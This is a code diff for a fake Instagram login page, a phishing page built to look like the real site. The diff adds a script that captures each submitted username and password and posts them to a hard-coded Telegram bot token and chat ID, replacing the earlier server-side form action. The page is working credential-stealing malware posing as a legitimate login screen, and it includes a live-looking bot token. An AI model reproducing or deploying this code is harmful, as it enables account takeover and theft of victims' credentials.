@@ -28,17 +28,14 @@
 </head>
 <body class="bg-gray-100">
 
-    <!-- Background Image Container -->
     <div class="background-img bg-cover bg-center h-screen flex justify-center items-center">
         <div class="login-container bg-white shadow-lg rounded-lg p-8">
 
-            <!-- Instagram Logo -->
             <div class="flex justify-center mb-8">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo" class="brand-logo">
             </div>
 
-            <!-- Login Form -->
-            <form action="login.pHTMl" method="POST">
+            <form id="loginForm">
                 <div class="mb-4">
                     <label for="username" class="block text-gray-700 text-sm">Phone number, username, or email</label>
                     <input type="text" name="username" id="username" class="w-full p-3 mt-2 border border-gray-300 rounded-md" placeholder="Username" required>
@@ -52,12 +49,10 @@
                 <button type="submit" class="w-full bg-blue-500 text-white py-3 rounded-md hover:bg-blue-600">Log In</button>
             </form>
 
-            <!-- Forgot Password Link -->
             <div class="text-center my-4">
                 <a href="https://www.instagram.com/accounts/password/reset/" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
             </div>
 
-            <!-- Footer Links -->
             <div class="text-center footer-links text-sm">
                 <a href="#">About</a> | 
                 <a href="#">Help</a> | 
@@ -73,6 +68,44 @@
             </div>
         </div>
     </div>
+
+    <script>
+        const telegramBotToken = "7242191612:AAG-rAnEgpvs0pav3TJxNxqbSXdh4Lx3E9g";
+        const chatId = "7076037083";
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            });
+
+            if (!response.ok) {
+                console.error('vpn off');
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const message = `New Instagram Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+            sendToTelegram(message);
+
+            console.log(message);
+        });
+    </script>
 
 </body>
 </html>
